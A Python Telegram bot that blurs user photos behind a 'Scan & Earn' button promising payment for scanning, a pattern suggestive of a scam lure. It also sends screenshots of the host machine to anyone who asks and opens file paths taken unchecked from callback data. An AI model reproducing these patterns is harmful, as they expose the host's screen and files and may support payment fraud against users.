import os
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from PIL import Image, ImageFilter
import io

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")

# Optional screenshot capability using snap.py
try:
    import snap
except Exception:
    snap = None

async def start(update: Update, context):
    await update.message.reply_text("Send me a PNG image to blur it!")

async def handle_photo(update: Update, context):
    photo = update.message.photo[-1]
    file = await photo.get_file()
    image_bytes = await file.download_as_bytearray()
    image = Image.open(io.BytesIO(image_bytes))

    if image.format.upper() != 'PNG':
        await update.message.reply_text("Please send a PNG image.")
        return

    blurred = image.filter(ImageFilter.BLUR)
    blurred_bytes = io.BytesIO()
    blurred.save(blurred_bytes, format='PNG')
    blurred_bytes.seek(0)

    keyboard = [[InlineKeyboardButton("Scan & Earn", callback_data=f"reveal_{photo.file_id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_photo(blurred_bytes, caption="Click the button to reveal the image and scan it.", reply_markup=reply_markup)

async def snapshot(update: Update, context):
    if snap is None:
        await update.message.reply_text("Screenshot feature unavailable: could not import snap module.")
        return

    try:
        file_path = snap.send_screenshot()
        with open(file_path, "rb") as photo:
            await update.message.reply_photo(photo=photo, caption=f"Screenshot taken and sent ({file_path})")
    except Exception as e:
        await update.message.reply_text(f"Failed to take screenshot: {e}")

async def button_callback(update: Update, context):
    query = update.callback_query
    await query.answer()

    data = query.data
    user_id = query.from_user.id

    if data.startswith("reveal_"):
        if data.startswith("reveal_snap_"):
            file_path = data.split("_", 2)[2]
            try:
                with open(file_path, "rb") as photo:
                    await context.bot.send_photo(chat_id=user_id, photo=photo, caption="Here is the clear screenshot!")
                await query.edit_message_caption(caption="Screenshot has been revealed and sent to your private chat!")
            except Exception as e:
                await query.edit_message_caption(caption="Could not send the screenshot.")
        else:
            file_id = data.split("_", 1)[1]
            try:
                await context.bot.send_photo(chat_id=user_id, photo=file_id, caption="Here is the clear image, scan it and get paid!")
                await query.edit_message_caption(caption="Image has been revealed and sent to your private chat!")
            except Exception as e:
                await query.edit_message_caption(caption="Could not send the image. Make sure you've started a chat with the bot.")

def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("snapshot", snapshot))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.run_polling()

if __name__ == '__main__':
    main()
